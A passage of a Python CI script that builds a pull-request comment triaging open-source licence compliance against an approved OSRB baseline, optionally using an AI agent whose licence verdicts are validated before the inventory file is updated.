# Caps on the two NOT_APPROVED lists so a large repo cannot flood the PR
# comment; any overflow is stated inline and the full set is in the artifact.
_THIRD_PARTY_CAP = 80
_BASE_IMAGE_CAP = 40


def _render_repo_state(state: dict, run_url: str) -> list[str]:
    """The whole-repo comparison, collapsed. Pre-existing state, not this PR.

    A reviewer sees the refusals, conditions and licence disagreements that the
    delta sections above never mention (because this PR did not introduce them)
    without downloading the compliance CSV. Framed explicitly as repo state so
    it is never read as something this PR must fix.
    """
    counts = state["counts"]
    refused = state["refused"]
    conditional = state["conditional"]
    drift = state["license_drift"]
    na = state["not_approved_class"]
    na_rows = state.get("not_approved_rows", {})
    actionable = (
        len(refused) + len(conditional) + len(drift)
        + state["version_drift_count"] + na.get("third_party", 0)
    )
    lines = [
        "<details>",
        f"<summary>Repo state vs the OSRB-approved baseline — "
        f"{actionable} to review (pre-existing, not introduced by this PR)</summary>",
        "",
        "The whole repository measured against the approved baseline, not this "
        "pull request's diff. Report-only; it never blocks. Full detail is in "
        "the `osrb-compliance` artifact"
        + (f" from [this run]({run_url})." if run_url else "."),
        "",
        "| verdict | rows |",
        "|---|---|",
    ]
    for verdict in (
        "OSRB_REFUSED", "OSRB_CONDITIONAL", "LICENSE_DRIFT",
        "VERSION_DRIFT", "NOT_APPROVED", "MODULE_UNSUBMITTED",
    ):
        if counts.get(verdict):
            lines.append(f"| {verdict} | {counts[verdict]} |")
    lines.append("")
    lines.append(
        f"Of {counts.get('NOT_APPROVED', 0)} NOT_APPROVED: "
        f"**{na.get('third_party', 0)} genuinely-unapproved third-party**, "
        f"{na.get('base_image', 0)} base-image / OS packages (need an image SBOM, "
        f"not an OSRB submission), {na.get('first_party', 0)} first-party names, "
        f"{na.get('artifact', 0)} scanner artifacts."
    )
    lines.append("")

    third_party = na_rows.get("third_party", [])
    if third_party:
        lines.append(
            "**Unapproved third-party packages** — the actionable rest once "
            "base-image/OS packages are set aside; each needs an OSRB submission:"
        )
        lines.append("| package | module | resolved licence |")
        lines.append("|---|---|---|")
        for row in third_party[:_THIRD_PARTY_CAP]:
            lines.append(
                f"| {markdown_cell(row.get('package', ''))} "
                f"| {markdown_cell(row.get('module', ''))} "
                f"| {markdown_cell((row.get('license', '') or '')[:30])} |"
            )
        extra = len(third_party) - _THIRD_PARTY_CAP
        if extra > 0:
            lines.append(
                f"| …and {extra} more | see the `osrb-compliance` artifact | |"
            )
        lines.append("")

    base_image = na_rows.get("base_image", [])
    if base_image:
        lines.append("<details>")
        lines.append(
            f"<summary>Base-image / OS packages ({len(base_image)}) — need an "
            f"image SBOM, not an OSRB submission</summary>"
        )
        lines.append("")
        lines.append(
            "Their licence ships inside a built image, not in a registry "
            "manifest, so an SBOM of the base image clears them rather than an "
            "OSRB row. Listed separately so they never crowd out the "
            "third-party packages above."
        )
        lines.append("")
        lines.append("| package | module | ecosystem |")
        lines.append("|---|---|---|")
        for row in base_image[:_BASE_IMAGE_CAP]:
            lines.append(
                f"| {markdown_cell(row.get('package', ''))} "
                f"| {markdown_cell(row.get('module', ''))} "
                f"| {markdown_cell(row.get('language', ''))} |"
            )
        extra = len(base_image) - _BASE_IMAGE_CAP
        if extra > 0:
            lines.append(
                f"| …and {extra} more | see the `osrb-compliance` artifact | |"
            )
        lines.append("")
        lines.append("</details>")
        lines.append("")

    if refused:
        lines.append("**Refused packages still present** — the most serious:")
        lines.append("| module | detail |")
        lines.append("|---|---|")
        for row in refused:
            lines.append(
                f"| {markdown_cell(row.get('module', ''))} "
                f"| {markdown_cell((row.get('notes', '') or '')[:160])} |"
            )
        lines.append("")

    if conditional:
        lines.append("**Conditional approvals shipping** (approval is not unconditional):")
        lines.append("| package | module | condition |")
        lines.append("|---|---|---|")
        for row in conditional[:12]:
            lines.append(
                f"| {markdown_cell(row.get('package', ''))} "
                f"| {markdown_cell(row.get('module', ''))} "
                f"| {markdown_cell((row.get('notes', '') or '')[:120])} |"
            )
        lines.append("")

    relabels = state.get("license_relabel_count", 0)
    if drift:
        lines.append(
            "**Licence disagreements** (repo resolves a different licence than approved):"
        )
        lines.append("| package | module | repo licence | approved licence |")
        lines.append("|---|---|---|---|")
        for row in drift[:20]:
            lines.append(
                f"| {markdown_cell(row.get('package', ''))} "
                f"| {markdown_cell(row.get('module', ''))} "
                f"| {markdown_cell((row.get('license', '') or '')[:30])} "
                f"| {markdown_cell((row.get('approved_license', '') or '')[:30])} |"
            )
        lines.append("")
    if relabels:
        lines.append(
            f"{relabels} further licence difference(s) are not listed: the repo "
            "ships them under a permissive licence, so they need no OSRB review "
            "whatever the baseline records. Every difference is in the "
            "`osrb-compliance` artifact."
        )
        lines.append("")

    lines.append("</details>")
    lines.append("")
    return lines


def build_comment(
    triage: dict[str, list],
    results: dict,
    run_url: str = "",
    repo_state: dict | None = None,
) -> str:
    """Render the PR comment. Pure: TriageInput + validated results in,
    markdown out; the caller decides where it goes. Everything is scrubbed
    of internal URLs on the way out."""
    validated = results.get("validated", [])
    rejected = results.get("rejected", [])
    flagged = results.get("flagged", [])
    unverifiable = results.get("unverifiable", [])
    not_triaged = results.get("not_triaged", [])
    skip_agent = results.get("skip_agent", False)
    agent_note = results.get("agent_note", "")

    cleared_keys = {
        (canonical_package(v["package"]), v["version"]) for v in validated
    }

    def dep_key(row: dict[str, str]) -> tuple[str, str]:
        return (
            canonical_package(row.get("package", "")),
            row.get("new_version", "") or row.get("version", ""),
        )

    conditioned = {
        canonical_package(entry["row"].get("package", ""))
        for entry in triage["refused_or_conditional"]
    }

    lines: list[str] = [MARKER, "# OSRB triage", ""]
    if skip_agent:
        lines += ["_Agent triage skipped this run"
                  + (f" ({agent_note})" if agent_note else "")
                  + "; UNKNOWN licences were not researched._", ""]
    elif agent_note:
        lines += [f"_{agent_note}_", ""]

    # -- 1. OSRB review required --------------------------------------------
    osrb_rows: list[list[str]] = []
    for entry in triage["refused_or_conditional"]:
        row, hits = entry["row"], entry["conditions"]
        for hit in hits:
            osrb_rows.append([
                row.get("package", ""),
                row.get("new_version", ""),
                row.get("module", ""),
                f"OSRB {hit.get('decision', 'condition')}: "
                f"{hit.get('condition', '')}",
                hit.get("evidence", ""),
            ])
    for row in triage["new_deps"]:
        if canonical_package(row.get("package", "")) in conditioned:
            continue  # already listed with the condition quoted
        licence = row.get("new_license", "")
        if license_is_unknown(licence) or is_permissive(licence, row.get("package", "")):
            continue  # unknowns are triage rows; permissive is section 2's verdict
        if dep_key(row) in cleared_keys:
            continue
        osrb_rows.append([
            row.get("package", ""),
            row.get("new_version", ""),
            row.get("module", ""),
            f"new dependency with non-permissive licence: {licence} "
            f"(risk: {license_risk(licence)})",
            row.get("repository_url", ""),
        ])
    for row in triage["license_changes"]:
        if not _risk_band_moved(row):
            continue
        osrb_rows.append([
            row.get("package", ""),
            f"{row.get('old_version', '')} → {row.get('new_version', '')}",
            row.get("module", ""),
            f"licence change moves risk band: {row.get('old_license', '')} "
            f"({license_risk(row.get('old_license', ''))}) → "
            f"{row.get('new_license', '')} "
            f"({license_risk(row.get('new_license', ''))})",
            row.get("repository_url", ""),
        ])
    for row in triage["usage_drift"]:
        osrb_rows.append([
            row.get("package", ""),
            row.get("version", ""),
            row.get("module", ""),
            f"usage drift: {row.get('notes', '') or 'approved use differs from observed use'}",
            row.get("source_file", ""),
        ])
    for verdict in rejected:
        osrb_rows.append([
            verdict.get("package", ""),
            verdict.get("version", ""),
            "",
            f"agent verdict rejected by validator: {verdict.get('validation', '')}",
            verdict.get("evidence_url", ""),
        ])
    for row in unverifiable:
        osrb_rows.append([
            row.get("package", ""),
            row.get("new_version", "") or row.get("version", ""),
            row.get("module", ""),
            "agent verdict unverifiable",
            "",
        ])
    for verdict in flagged:
        osrb_rows.append([
            verdict.get("package", ""),
            verdict.get("version", ""),
            "",
            f"agent flagged for OSRB: {verdict.get('reasoning', '') or 'needs review'}",
            verdict.get("evidence_url", ""),
        ])
    for entry in not_triaged:
        row, why = entry["row"], entry["reason"]
        osrb_rows.append([
            row.get("package", ""),
            row.get("new_version", "") or row.get("version", ""),
            row.get("module", ""),
            f"not triaged this run ({why})",
            "",
        ])

    lines.append("## OSRB review required")
    lines.append("")
    if osrb_rows:
        lines += _table(["Package", "Version", "Module", "Reason", "Evidence"],
                        osrb_rows)
    else:
        lines.append(
            "Nothing in this change requires OSRB review: no refused or "
            "conditional package is touched, every new dependency is "
            "permissively licensed, no licence change moves a risk band, and "
            "no usage drift was detected."
        )
    lines.append("")

    # -- 2. New dependencies --------------------------------------------------
    lines.append("## New dependencies")
    lines.append("")
    # A permissively licensed new dependency is allowed, so it is not
    # something OSRB is being asked to review: it is counted here and carried
    # in the inventory the run commits. A condition on file always outranks
    # the licence -- ffmpeg and mkl look permissive and are still not cleared.
    new_dep_rows = []
    permissive_new = 0
    for row in triage["new_deps"]:
        licence = row.get("new_license", "")
        pkg = row.get("package", "")
        if canonical_package(pkg) in conditioned:
            verdict = "OSRB review required (condition on file)"
        elif is_permissive(licence, pkg):
            permissive_new += 1
            continue
        elif dep_key(row) in cleared_keys:
            permissive_new += 1
            continue
        elif license_is_unknown(licence):
            verdict = "needs review (licence unknown)"
        else:
            verdict = "needs review (licence not permissive)"
        new_dep_rows.append([pkg, row.get("new_version", ""), licence,
                             row.get("module", ""), verdict])
    if new_dep_rows:
        lines += _table(["Package", "Version", "Licence", "Module", "Verdict"],
                        new_dep_rows)
    else:
        lines.append("None that need OSRB review."
                     if permissive_new else "None.")
    if permissive_new:
        lines.append("")
        lines.append(
            f"{permissive_new} new dependenc"
            f"{'y is' if permissive_new == 1 else 'ies are'} permissively "
            "licensed and not listed; "
            f"{'it is' if permissive_new == 1 else 'they are'} recorded in "
            "`inventory.csv` and the `osrb-compliance` artifact."
        )
    lines.append("")

    # -- 3. Licence changes on version updates -------------------------------
    lines.append("## Licence changes on version updates")
    lines.append("")
    # Judged on the licence the update lands on, not on the fact that it
    # moved: a version bump that ends permissive needs no OSRB review, however
    # it got there. A condition on file still outranks the licence.
    changed = [
        row for row in triage["license_changes"]
        if canonical_package(row.get("package", "")) in conditioned
        or not is_permissive(row.get("new_license", ""), row.get("package", ""))
    ]
    permissive_changes = len(triage["license_changes"]) - len(changed)
    if changed:
        rows = [
            [
                row.get("package", ""),
                f"{row.get('old_version', '')} → {row.get('new_version', '')}",
                f"{row.get('old_license', '')} → {row.get('new_license', '')}",
                f"{license_risk(row.get('old_license', ''))} → "
                f"{license_risk(row.get('new_license', ''))}",
                row.get("module", ""),
            ]
            for row in changed
        ]
        lines += _table(["Package", "Version", "Licence", "Risk", "Module"], rows)
    else:
        lines.append("None that need OSRB review."
                     if permissive_changes
                     else "None. (Normalised comparison: a relabel like "
                          "\"MIT License\" → \"MIT\" is not a change.)")
    if permissive_changes:
        lines.append("")
        lines.append(
            f"{permissive_changes} licence change"
            f"{'' if permissive_changes == 1 else 's'} landed on a permissive "
            "licence and "
            f"{'is' if permissive_changes == 1 else 'are'} not listed; see the "
            "`osrb-compliance` artifact."
        )
    lines.append("")

    # -- 4. Usage drift --------------------------------------------------------
    lines.append("## Usage drift")
    lines.append("")
    if triage["usage_drift"]:
        rows = [
            [
                row.get("package", ""),
                row.get("version", ""),
                row.get("module", ""),
                row.get("source_file", ""),
                row.get("notes", ""),
            ]
            for row in triage["usage_drift"]
        ]
        lines += _table(["Package", "Version", "Module", "Evidence source",
                         "Notes"], rows)
    else:
        lines.append("None.")
    lines.append("")

    # -- 5. Auto-cleared (collapsed) -------------------------------------------
    lines.append("<details>")
    lines.append("<summary>Auto-cleared (permissive)</summary>")
    lines.append("")
    lines.append("## Auto-cleared (permissive)")
    lines.append("")
    if validated:
        rows = [
            [
                v.get("package", ""),
                v.get("version", ""),
                v.get("license", ""),
                v.get("evidence_url", ""),
            ]
            for v in validated
        ]
        lines += _table(["Package", "Version", "Licence", "Evidence"], rows)
    else:
        lines.append("Nothing was agent-cleared this run.")
    lines.append("")
    lines.append("</details>")
    lines.append("")

    if triage["removed"]:
        removed = ", ".join(
            f"{row.get('package', '')} {row.get('old_version', '')}".strip()
            for row in triage["removed"]
        )
        lines.append(f"_Removed dependencies (report-only): {removed}_")
        lines.append("")

    # -- 5b. Repo state (report-only, pre-existing) ------------------------------
    if repo_state:
        lines.extend(_render_repo_state(repo_state, run_url))

    # -- 6. Footer ---------------------------------------------------------------
    lines.append("---")
    lines.append("")
    lines.append(
        "**Permissive means** "
        + ", ".join(f"`{name}`" for name in permissive_summary())
        + " (and their common spellings; an expression clears only when every "
        "operand does). This is the list `.github/scripts/"
        "check_python_licenses.py` defines and its `license_passes` evaluates "
        "-- one definition, not a second copy. A package on it needs no OSRB "
        "review, so it is "
        "counted above rather than listed, and recorded in `inventory.csv` and "
        "the `osrb-compliance` artifact. An OSRB condition on file outranks it."
    )
    lines.append(
        "Replaces the internal OSRB reviewer bot. The blocking gate is the "
        "OSRB Scan delta check; this comment is triage."
        + (f" [Run]({run_url})" if run_url else "")
    )
    return scrub_internal("\n".join(lines) + "\n")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def _default_run_url() -> str:
    server = os.environ.get("GITHUB_SERVER_URL", "")
    repo = os.environ.get("GITHUB_REPOSITORY", "")
    run_id = os.environ.get("GITHUB_RUN_ID", "")
    if server and repo and run_id:
        return f"{server}/{repo}/actions/runs/{run_id}"
    return ""


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--delta", help="license-diff.csv from the scan job")
    parser.add_argument("--compliance", help="osrb-compliance.csv from the compare step")
    parser.add_argument("--inventory", help=".github/osrb/inventory.csv")
    parser.add_argument("--approved", help=".github/osrb/approved.csv")
    parser.add_argument("--conditions", help=".github/osrb/conditions.csv")
    parser.add_argument("--comment-out", help="where to write the PR comment markdown")
    parser.add_argument("--verdicts-out", help="where to write triage-verdicts.json")
    parser.add_argument("--skip-agent", action="store_true",
                        help="deterministic pre-pass + comment only, no model")
    parser.add_argument("--max-unknowns", type=int, default=25,
                        help="bound on rows handed to the agent; overflow rows "
                             "go to the OSRB section as 'not triaged this run'")
    parser.add_argument("--check-inventory-diff", nargs=2,
                        metavar=("OLD", "NEW"),
                        help="standalone guard mode: verify NEW differs from "
                             "OLD only in license/risk on existing rows; exit "
                             "2 otherwise. Used by the workflow before "
                             "committing an inventory update.")
    args = parser.parse_args(argv)

    if args.check_inventory_diff:
        old = load_rows(args.check_inventory_diff[0])
        new = load_rows(args.check_inventory_diff[1])
        problems = validate_inventory_diff(old, new)
        for problem in problems:
            print(f"[osrb-triage] inventory diff REJECTED: {problem}",
                  file=sys.stderr)
        if not problems:
            print("[osrb-triage] inventory diff ok: only license/risk changed",
                  file=sys.stderr)
        return 2 if problems else 0

    required = ("delta", "compliance", "inventory", "approved", "conditions",
                "comment_out", "verdicts_out")
    missing = [name for name in required if not getattr(args, name)]
    if missing:
        parser.error("missing required arguments: "
                     + ", ".join("--" + n.replace("_", "-") for n in missing))

    delta_rows = load_rows(args.delta)
    compliance_rows = load_rows(args.compliance)
    conditions = load_conditions(args.conditions)
    inv_fields, inventory_rows = load_inventory(args.inventory)

    triage = build_triage_input(delta_rows, compliance_rows, conditions)
    work = research_rows(triage)
    overflow = work[args.max_unknowns:]
    work = work[:args.max_unknowns]

    results: dict = {
        "validated": [], "rejected": [], "flagged": [], "unverifiable": [],
        "not_triaged": [{"row": row, "reason": "over --max-unknowns bound"}
                        for row in overflow],
        "skip_agent": False, "agent_note": "",
    }

    skip = args.skip_agent
    if not skip and not os.environ.get("ANTHROPIC_API_KEY"):
        skip = True
        results["agent_note"] = "no ANTHROPIC_API_KEY"
    exit_code = 0

    if skip:
        results["skip_agent"] = True
        results["not_triaged"] += [
            {"row": row, "reason": "agent skipped"} for row in work
        ]
    elif work:
        text, hit_max_turns, error = run_agent(work)
        if error:
            results["skip_agent"] = True
            results["agent_note"] = error
            results["not_triaged"] += [
                {"row": row, "reason": f"agent unavailable: {error}"}
                for row in work
            ]
        else:
            verdicts, parse_error = parse_agent_verdicts(text)
            assigned = {
                (canonical_package(r.get("package", "")),) for r in work
            }
            verdicts = [
                v for v in verdicts
                if (canonical_package(v["package"]),) in assigned
            ]
            covered = {canonical_package(v["package"]) for v in verdicts}
            results["unverifiable"] = [
                row for row in work
                if canonical_package(row.get("package", "")) not in covered
            ]
            if parse_error:
                results["agent_note"] = f"agent output unusable: {parse_error}"
            validated, rejected_v, flagged = validate_verdicts(
                verdicts, inventory_rows, conditions, fetch_evidence
            )
            results["validated"] = validated
            results["rejected"] = rejected_v
            results["flagged"] = flagged
            if hit_max_turns:
                exit_code = 3
            elif rejected_v or results["unverifiable"] or parse_error:
                exit_code = 2

    # Inventory update: validated permissive verdicts seed UNKNOWN rows, then
    # the same diff guard the workflow uses re-proves the write shape before
    # anything is persisted.
    changed = apply_verdicts_to_inventory(inventory_rows, results["validated"])
    if changed:
        _, before_rows = load_inventory(args.inventory)
        problems = validate_inventory_diff(before_rows, inventory_rows)
        if problems:
            for problem in problems:
                print(f"[osrb-triage] inventory write ABORTED: {problem}",
                      file=sys.stderr)
            exit_code = exit_code or 2
        else:
            write_inventory(args.inventory, inv_fields, inventory_rows)
            print(f"[osrb-triage] inventory.csv updated: {changed} row(s)",
                  file=sys.stderr)

    repo_state = summarize_repo_state(compliance_rows)
    comment = build_comment(
        triage, results, run_url=_default_run_url(), repo_state=repo_state
    )
    Path(args.comment_out).write_text(comment, encoding="utf-8")

    verdicts_doc = {
        "skip_agent": results["skip_agent"],
        "agent_note": results["agent_note"],
        "validated": results["validated"],
        "rejected": results["rejected"],
        "flagged": results["flagged"],
        "unverifiable": [
            {"package": r.get("package", ""),
             "version": r.get("new_version", "") or r.get("version", "")}
            for r in results["unverifiable"]
        ],
        "not_triaged": [
            {"package": e["row"].get("package", ""),
             "version": e["row"].get("new_version", "")
             or e["row"].get("version", ""),
             "reason": e["reason"]}
            for e in results["not_triaged"]
        ],
        "inventory_rows_updated": changed,
        "counts": {key: len(triage[key]) for key in triage},
    }
    Path(args.verdicts_out).write_text(
        scrub_internal(json.dumps(verdicts_doc, indent=2)) + "\n",
        encoding="utf-8",
    )

    print(f"[osrb-triage] comment -> {args.comment_out}; "
          f"verdicts -> {args.verdicts_out}; exit {exit_code}",
          file=sys.stderr)
    return exit_code


if __name__ == "__main__":
    sys.exit(main())
